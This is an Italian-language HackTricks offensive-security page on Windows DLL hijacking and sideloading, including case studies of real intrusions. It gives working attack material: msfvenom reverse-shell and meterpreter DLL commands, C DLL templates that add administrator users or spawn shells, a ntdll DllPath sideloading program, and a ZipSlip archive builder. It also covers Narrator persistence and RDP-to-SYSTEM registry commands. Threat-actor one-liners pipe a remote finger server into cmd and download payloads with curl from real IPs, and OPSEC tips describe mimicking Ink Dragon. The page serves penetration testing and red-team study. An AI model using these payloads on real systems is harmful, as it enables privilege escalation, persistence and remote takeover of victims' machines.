# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking consiste nel manipolare un'applicazione trusted affinché carichi una DLL malevola. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene usato principalmente per code execution, ottenere persistence e, meno frequentemente, privilege escalation. Nonostante il focus su privilege escalation qui, il metodo di DLL hijacking rimane consistente tra gli obiettivi.

### Tecniche comuni

Diversi metodi vengono impiegati per il DLL hijacking, ognuno con la sua efficacia a seconda della strategia di caricamento delle DLL dell'applicazione:

1. **DLL Replacement**: Scambiare una DLL genuina con una maligna, eventualmente usando DLL Proxying per preservare la funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: Posizionare la DLL malevola in un percorso di ricerca che precede quella legittima, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL malevola che un'applicazione tenterà di caricare, pensando si tratti di una DLL richiesta non esistente.
4. **DLL Redirection**: Modificare parametri di ricerca come `%PATH%` o i file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Posizionare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, somigliante alle tecniche di Binary Proxy Execution.

> [!TIP]
> Per una catena passo-passo che sovrappone HTML staging, AES-CTR configs e .NET implants sopra il DLL sideloading, rivedi il workflow qui sotto.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Trovare Dll mancanti

Il modo più comune per trovare Dll mancanti in un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrare solo la **File System Activity**:

![](<../../../images/image (153).png>)

Se stai cercando **missing dlls in general** lascia questo in esecuzione per alcuni **secondi**.\
Se stai cercando una **missing dll inside an specific executable** dovresti impostare **un altro filtro come "Process Name" "contains" `<exec name>`, eseguirlo e fermare la cattura degli eventi**.

## Sfruttare Dll mancanti

In order to escalate privileges, la migliore possibilità che abbiamo è poter **scrivere una dll che un processo privilegiato tenterà di caricare** in uno dei **luoghi in cui verrà cercata**. Quindi, saremo in grado di **scrivere** una dll in una **cartella** dove la **dll viene cercata prima** della cartella dove si trova la **dll originale** (caso strano), oppure saremo in grado di **scrivere in qualche cartella dove la dll verrà cercata** e la **dll originale non esiste** in nessuna cartella.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Le applicazioni Windows cercano le DLL seguendo un insieme di percorsi di ricerca predefiniti, aderendo a una sequenza particolare. Il problema del DLL hijacking si verifica quando una DLL dannosa viene posizionata strategicamente in una di queste directory, assicurandosi che venga caricata prima della DLL autentica. Una soluzione per prevenirlo è far sì che l'applicazione usi percorsi assoluti quando si riferisce alle DLL di cui ha bisogno.

Puoi vedere l'**ordine di ricerca delle DLL su sistemi a 32-bit** qui sotto:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Questo è l'ordine di ricerca di default con **SafeDllSearchMode** abilitato. Quando è disabilitato la directory corrente sale al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** e impostalo a 0 (di default è abilitato).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Infine, nota che **una dll potrebbe essere caricata indicando il percorso assoluto invece del solo nome**. In quel caso quella dll verrà cercata **solo in quel percorso** (se la dll ha dipendenze, queste verranno cercate come se fossero state caricate solo per nome).

Esistono altri modi per modificare l'ordine di ricerca ma non li spiegherò qui.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Usa i filtri di ProcMon (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) per raccogliere i nomi di DLL che il processo prova ma non riesce a trovare.
2. Se il binario gira su un scheduler/service, piazzare una DLL con uno di quei nomi nella directory dell'applicazione (search-order entry #1) verrà caricata alla successiva esecuzione. In un caso con uno scanner .NET il processo cercava `hostfxr.dll` in `C:\samples\app\` prima di caricare la copia reale da `C:\Program Files\dotnet\fxr\...`.
3. Costruisci una payload DLL (es. reverse shell) con qualsiasi export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se la tua primitive è una ZipSlip-style arbitrary write, crea uno ZIP la cui entry esce dalla directory di estrazione in modo che la DLL finisca nella cartella dell'applicazione:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Consegnare l'archivio alla inbox/share monitorata; quando l'attività pianificata rilancerà il processo, questo caricherà la DLL malevola ed eseguirà il tuo codice con l'account di servizio.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il DLL search path di un processo appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le native API di ntdll. Fornendo qui una directory controllata dall'attaccante, un processo target che risolve una DLL importata per nome (nessun percorso assoluto e senza usare i flag di safe loading) può essere costretto a caricare una DLL malevola da quella directory.

Idea chiave
- Costruisci i parametri del processo con RtlCreateProcessParametersEx e fornisci un DllPath personalizzato che punti alla cartella sotto il tuo controllo (es., la directory dove risiede il tuo dropper/unpacker).
- Crea il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL per nome, il loader consulterà questo DllPath fornito durante la risoluzione, permettendo uno sideloading affidabile anche quando la DLL malevola non è colocalizzata con l'EXE target.

Note/limitazioni
- Questo influisce sul processo figlio creato; è diverso da SetDllDirectory, che influenza solo il processo corrente.
- Il target deve importare o chiamare LoadLibrary su una DLL per nome (nessun percorso assoluto e non usando LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e percorsi assoluti hardcoded non possono essere hijacked. Forwarded exports e SxS possono cambiare la precedenza.

Esempio C minimale (ntdll, wide strings, gestione errori semplificata):

<details>
<summary>Esempio C completo: forzare DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio d'uso operativo
- Posiziona una xmllite.dll malevola (esportando le funzioni richieste o fungendo da proxy per quella reale) nella tua directory DllPath.
- Avvia un binario firmato noto per cercare xmllite.dll per nome usando la tecnica sopra descritta. Il loader risolve l'import tramite il DllPath fornito e sideloads la tua DLL.

Questa tecnica è stata osservata in-the-wild per guidare catene di multi-stage sideloading: un launcher iniziale deposita una helper DLL, che poi lancia un binario Microsoft-signed, hijackable, con un DllPath personalizzato per forzare il caricamento della DLL dell’attaccante da una staging directory.


#### Exceptions on dll search order from Windows docs

Alcune eccezioni all'ordine di ricerca standard delle DLL sono riportate nella documentazione di Windows:

- Quando si incontra una **DLL che condivide il suo nome con una già caricata in memoria**, il sistema oltrepassa la ricerca usuale. Invece, esegue un controllo per redirection e un manifest prima di ricorrere alla DLL già in memoria. **In questo scenario, il sistema non esegue una ricerca per la DLL**.
- Nei casi in cui la DLL è riconosciuta come una **known DLL** per la versione corrente di Windows, il sistema utilizzerà la sua versione della known DLL, insieme a eventuali DLL dipendenti, **saltando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene l'elenco di queste known DLL.
- Se una **DLL ha dipendenze**, la ricerca per queste DLL dipendenti viene condotta come se fossero indicate soltanto dai loro **nomi dei moduli**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

- Identificare un processo che opera o opererà con **privilegi differenti** (movimento orizzontale o laterale), che è **privo di una DLL**.
- Assicurarsi che sia disponibile **accesso in scrittura** per qualsiasi **directory** in cui la **DLL** verrà **cercata**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory nel system path.

Sì, i requisiti sono complicati da trovare poiché **di default è un po' strano trovare un eseguibile privilegiato privo di una DLL** ed è ancora **più strano avere permessi di scrittura su una cartella del system path** (di norma non puoi). Però, in ambienti mal configurati questo è possibile.\
Nel caso tu sia fortunato e soddisfi i requisiti, puoi dare un'occhiata al progetto [UACME](https://github.com/hfiref0x/UACME). Anche se l'**obiettivo principale del progetto è bypass UAC**, potresti trovare lì una **PoC** di Dll hijacking per la versione di Windows che puoi usare (probabilmente cambiando solo il percorso della cartella in cui hai permessi di scrittura).

Nota che puoi **verificare i tuoi permessi in una cartella** eseguendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifica i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare gli imports di un eseguibile e gli exports di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abusare Dll Hijacking to escalate privileges** avendo permessi di scrittura in una **cartella del System Path** consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificherà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatici interessanti per scoprire questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll_.

### Example

Nel caso trovassi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Comunque, nota che Dll Hijacking è utile per [escalare da Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** in questo studio su dll hijacking per esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **template** o per creare una **dll che esporti funzioni non necessarie**.

## **Creazione e compilazione di Dlls**

### **Dll Proxifying**

Fondamentalmente un **Dll proxy** è una Dll in grado di **eseguire il tuo codice malevolo quando viene caricata** ma anche di **esporsi** e **funzionare** come previsto **inoltrando tutte le chiamate alla libreria reale**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxificare e **generare una dll proxificata** oppure **indicare la Dll** e **generare una dll proxificata**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86, non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

Nota che in diversi casi la Dll che compili deve **esportare diverse funzioni** che verranno caricate dal victim process; se queste funzioni non esistono il **binary non sarà in grado di caricarle** e il **exploit fallirà**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio C++ DLL con creazione utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa con thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso di studio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a cercare all'avvio una localization DLL prevedibile e specifica per la lingua che può essere hijacked per arbitrary code execution e persistence.

Key facts
- Percorso di ricerca (build correnti): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build più vecchi): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se una DLL scrivibile e controllata dall'attaccante esiste nel percorso OneCore, viene caricata e `DllMain(DLL_PROCESS_ATTACH)` viene eseguita. Non sono necessari export.

Discovery with Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Avviare Narrator e osservare il tentativo di caricamento del percorso sopra riportato.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silenzio
- Un hijack ingenuo parlerà/evidenzierà l'UI. Per restare silenziosi, al momento dell'attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e `SuspendThread` su di esso; continua nel tuo thread. Vedi PoC per il codice completo.

Trigger and persistence via Accessibility configuration
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviando Narrator viene caricata la DLL piazzata. Sul secure desktop (schermata di logon), premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Esegui RDP verso l'host; nella schermata di logon premi CTRL+WIN+ENTER per lanciare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop.
- L'esecuzione si interrompe quando la sessione RDP viene chiusa—inject/migrate prontamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di un Accessibility Tool (AT) incorporato (es. CursorIndicator), modificarla per puntare a un binario/DLL arbitrario, importarla e poi impostare `configuration` su quel nome AT. Questo fa da proxy per l'esecuzione arbitraria sotto il framework Accessibility.

Notes
- Scrivere sotto `%windir%\System32` e modificare valori HKLM richiede privilegi admin.
- Tutta la logica del payload può vivere in `DLL_PROCESS_ATTACH`; non sono necessari export.

## Caso di studio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra **Phantom DLL Hijacking** nel TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.

### Dettagli della vulnerabilità

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementazione dell'exploit

Un attaccante può posizionare uno stub `hostfxr.dll` dannoso nella stessa directory, sfruttando la DLL mancante per ottenere esecuzione di codice nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Come utente standard, posiziona `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi che l'attività pianificata venga eseguita alle 9:30 sotto il contesto dell'utente corrente.
3. Se un amministratore è connesso quando il task viene eseguito, la DLL malevola viene eseguita nella sessione dell'amministratore a medium integrity.
4. Collega tecniche standard di UAC bypass per elevare da medium integrity a privilegi SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Gli attori di minaccia spesso associano MSI-based droppers con DLL side-loading per eseguire payload sotto un processo firmato e affidabile.

Chain overview
- L'utente scarica un MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione GUI (es., LaunchApplication o un'azione VBScript), ricostruendo la fase successiva dalle risorse incorporate.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (esempio coppia: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Quando l'EXE firmato viene avviato, l'ordine di ricerca DLL di Windows carica wsc.dll dalla directory di lavoro per primo, eseguendo il codice dell'attaccante sotto un parent firmato (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Cerca voci che eseguono eseguibili o VBScript. Esempio di pattern sospetto: LaunchApplication che esegue un file incorporato in background.
- In Orca (Microsoft Orca.exe), ispeziona le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload incorporati/suddivisi nel CAB dell'MSI:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Cerca più piccoli frammenti che vengono concatenati e decrittografati da una CustomAction VBScript. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Posiziona questi due file nella stessa cartella:
- wsc_proxy.exe: host legittimo firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla sua directory.
- wsc.dll: attacker DLL. Se non sono richiesti exports specifici, DllMain può essere sufficiente; altrimenti, costruisci una proxy DLL e inoltra gli exports richiesti alla libreria genuina mentre esegui il payload in DllMain.
- Crea un payload DLL minimale:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di export, usa un framework di proxying (es., DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione del nome della DLL da parte del binario host. Se l'host usa percorsi assoluti o flag di caricamento sicuro (es., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l'hijack può fallire.
- KnownDLLs, SxS e forwarded exports possono influenzare la precedenza e devono essere considerati durante la selezione del binario host e dell'insieme di export.

## Triadi firmate + payload criptati (caso ShadowPad)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per mimetizzarsi con software legittimo mantenendo il payload principale criptato su disco:

1. **Signed host EXE** – vendor come AMD, Realtek o NVIDIA vengono abusati (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attaccanti rinominano l'eseguibile per farlo sembrare un binario Windows (per esempio `conhost.exe`), ma la firma Authenticode rimane valida.
2. **Malicious loader DLL** – posizionata accanto all'EXE con il nome atteso (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è solitamente un binario MFC offuscato con il framework ScatterBrain; il suo unico compito è localizzare il blob criptato, decrittarlo e reflectively map ShadowPad.
3. **Encrypted payload blob** – spesso memorizzato come `<name>.tmp` nella stessa directory. Dopo aver memory-mapped il payload decriptato, il loader cancella il file TMP per distruggere le prove forensi.

Note operative:

* Rinominare l'EXE firmato (mantenendo l'`OriginalFileName` originale nell'header PE) gli consente di mascherarsi come un binario Windows mantenendo però la firma del vendor, quindi riproduci l'abitudine di Ink Dragon di lasciare binari che sembrano `conhost.exe` ma che in realtà sono utility AMD/NVIDIA.
* Poiché l'eseguibile rimane trusted, la maggior parte dei controlli di allowlisting richiede solo che la tua malicious DLL sia posta accanto a esso. Concentrati sul personalizzare la loader DLL; il signed parent può tipicamente essere eseguito intatto.
* Il decryptor di ShadowPad si aspetta che il blob TMP risieda accanto al loader e sia scrivibile così da poter azzerare il file dopo il mapping. Mantieni la directory scrivibile fino al caricamento del payload; una volta in memoria il file TMP può essere cancellato in sicurezza per OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Gli operatori accoppiano DLL sideloading con LOLBAS in modo che l'unico artefatto custom su disco sia la malicious DLL accanto all'EXE trusted:

- **Remote command loader (Finger):** PowerShell nascosto avvia `cmd.exe /c`, recupera comandi da un server Finger e li passa a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` recupera testo via TCP/79; `| cmd` esegue la risposta del server, permettendo agli operatori di ruotare il second stage lato server.

- **Built-in download/extract:** Scarica un archivio con un'estensione innocua, scompattalo e piazza il target di sideload e la DLL in una cartella casuale sotto `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` nasconde il progresso e segue i redirect; `tar -xf` usa il tar integrato di Windows.

- **WMI/CIM launch:** Avvia l'EXE via WMI così la telemetria mostrerà un processo creato da CIM mentre carica la DLL colocata:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funziona con binari che preferiscono DLL locali (es., `intelbq.exe`, `nearby_share.exe`); il payload (es., Remcos) viene eseguito con il nome trusted.

- **Hunting:** Genera alert su `forfiles` quando `/p`, `/m` e `/c` compaiono insieme; è raro al di fuori di script admin.


## Caso di studio: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una recente intrusione di Lotus Blossom ha sfruttato una catena di aggiornamento trusted per consegnare un dropper NSIS che ha staged un DLL sideload e payload eseguiti completamente in memoria.

Flusso operativo
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca **HIDDEN**, deposita un Bitdefender Submission Wizard rinominato `BluetoothService.exe`, una malicious `log.dll` e un blob criptato `BluetoothService`, quindi lancia l'EXE.
- L'EXE host importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` effettua un mmap-load del blob; `LogWrite` lo decrittografa con uno stream custom basato su LCG (constanti **0x19660D** / **0x3C6EF35F**, materiale chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in chiaro, libera i temporanei e salta ad esso.
- Per evitare un'IAT, il loader risolve le API hashando i nomi degli export usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, quindi applicando una avalanche in stile Murmur (**0x85EBCA6B**) e confrontando con hash target salati.

Main shellcode (Chrysalis)
- Decrypts a PE-like main module by repeating add/XOR/sub with key `gQ2JR&9;` over five passes, then dynamically loads `Kernel32.dll` → `GetProcAddress` to finish import resolution.
- Reconstructs DLL name strings at runtime via per-character bit-rotate/XOR transforms, then loads `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Uses a second resolver that walks the **PEB → InMemoryOrderModuleList**, parses each export table in 4-byte blocks with Murmur-style mixing, and only falls back to `GetProcAddress` if the hash is not found.

Configurazione incorporata & C2
- La configurazione risiede nel file `BluetoothService` droppato a **offset 0x30808** (dimensione **0x980**) ed è decriptata con RC4 usando la chiave `qwhvb^435h&*7`, rivelando la URL del C2 e lo User-Agent.
